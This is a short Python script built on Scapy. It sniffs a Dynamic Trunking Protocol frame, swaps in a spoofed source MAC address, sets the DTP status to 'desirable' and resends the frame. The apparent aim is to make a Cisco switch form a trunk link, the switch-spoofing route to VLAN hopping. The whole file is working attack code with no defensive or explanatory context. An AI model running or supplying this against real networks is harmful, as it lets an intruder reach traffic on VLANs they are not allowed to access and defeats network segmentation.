from scapy.all import *
load_contrib("dtp")

#Capture DTP Frame
pkt = sniff(filter="ether dst 3c:f9:f0:21:f8:07", count=1)

#Change the Mac address
pkt[0].src = "5c:cd:5b:3a:8c:f2"

#Change to desirable DTP settings
pkt[0][DTP][DTPStatus].status = '\x03'

#send into network
sendp(pkt[0], loop=0, verbose=1)